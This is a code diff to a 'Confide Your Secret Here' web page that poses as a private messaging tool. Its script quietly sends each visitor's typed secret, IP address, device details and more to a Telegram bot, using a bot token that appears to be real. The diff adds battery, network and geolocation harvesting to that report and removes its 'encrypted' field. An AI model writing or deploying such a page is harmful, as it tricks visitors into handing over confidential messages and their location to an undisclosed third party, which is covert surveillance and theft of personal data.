@@ -7,43 +7,45 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
-            background: linear-gradient(135deg, #1e1e1e, #3b3b3b);
+            background: linear-gradient(135deg, #000000, #1a1a1a);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             font-family: 'Inter', sans-serif;
-            color: #f3f4f6;
+            color: #d1d5db;
         }
         .container {
-            background: #252525;
+            background: #0d0d0d;
             border-radius: 1rem;
             padding: 2rem;
-            box-shadow: 0 0 30px rgba(236, 72, 153, 0.4);
+            box-shadow: 0 0 25px rgba(255, 255, 255, 0.1);
+            border: 1px solid #333333;
         }
         textarea {
-            background: #2f2f2f;
-            border: 2px solid #ec4899;
+            background: #1a1a1a;
+            border: 2px solid #ffffff;
             border-radius: 0.5rem;
             transition: border-color 0.3s ease;
         }
         textarea:focus {
-            border-color: #f9a8d4;
+            border-color: #cccccc;
         }
         .send-btn {
-            background: linear-gradient(90deg, #ec4899, #f9a8d4);
+            background: linear-gradient(90deg, #ffffff, #e5e5e5);
+            color: #000000;
         }
         .send-btn:hover {
-            background: linear-gradient(90deg, #db2777, #ec4899);
+            background: linear-gradient(90deg, #e5e5e5, #cccccc);
         }
     </style>
 </head>
 <body class="antialiased">
     <div class="w-full max-w-md p-6">
         <div class="container">
-            <h1 class="text-2xl font-bold text-center mb-4 text-pink-300">Share Your Secret 🤫</h1>
+            <h1 class="text-2xl font-bold text-center mb-4 text-gray-300">Confide Your Secret Here 🔐</h1>
             <textarea id="message" rows="5" class="w-full text-gray-200 rounded-md p-3 focus:outline-none resize-none" placeholder="Type your secret message..."></textarea>
-            <button id="sendBtn" class="send-btn mt-4 w-full text-white font-semibold py-2 rounded-md transition duration-300">Send Secretly 🚀</button>
+            <button id="sendBtn" class="send-btn mt-4 w-full font-semibold py-2 rounded-md transition duration-300">Send Secretly 🚀</button>
             <p id="status" class="mt-3 text-center text-sm text-gray-400"></p>
         </div>
     </div>
@@ -59,6 +61,16 @@
             const screen = `${window.screen.width}x${window.screen.height}`;
             const timestamp = new Date().toISOString();
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const connection = navigator.connection || {};
+            const battery = navigator.getBattery ? await navigator.getBattery() : { level: 'N/A', charging: 'N/A' };
+            const geolocation = await new Promise(resolve => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                    () => resolve('N/A')
+                );
+            });
+            const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+            const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
 
             return {
                 ip: ipData.ip,
@@ -68,18 +80,22 @@
                 language,
                 screen,
                 timestamp,
-                timezone
+                timezone,
+                batteryLevel: battery.level,
+                batteryCharging: battery.charging,
+                networkType: connection.effectiveType || 'N/A',
+                geolocation,
+                cookiesEnabled,
+                onlineStatus
             };
         }
 
         async function sendToTelegram(message, userInfo) {
             const botToken = '8179260298:AAECPoAzoyCu3l3vK4Uxeg3qdVlMO4wJfwE'; // Replace with your bot token
             const chatId = '1987268737'; // Replace with your chat ID
-            const encryptedMessage = btoa(message);
             const text = `
 *🔒 New Secret Message 🔒*
 📝 *Message*: ${message}
-🔐 *Encrypted*: ${encryptedMessage}
 🌐 *IP*: ${userInfo.ip}
 📱 *Device*: ${userInfo.userAgent}
 💻 *Platform*: ${userInfo.platform}
@@ -88,6 +104,11 @@
 🖥️ *Screen*: ${userInfo.screen}
 ⏰ *Time*: ${userInfo.timestamp}
 🌎 *Timezone*: ${userInfo.timezone}
+🔋 *Battery*: ${userInfo.batteryLevel * 100}% (${userInfo.batteryCharging ? 'Charging ⚡️' : 'Not Charging 🔌'})
+📡 *Network*: ${userInfo.networkType}
+📍 *Location*: ${typeof userInfo.geolocation === 'object' ? `Lat: ${userInfo.geolocation.lat}, Lon: ${userInfo.geolocation.lon}` : userInfo.geolocation}
+🍪 *Cookies Enabled*: ${userInfo.cookiesEnabled}
+📶 *Online Status*: ${userInfo.onlineStatus}
             `;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
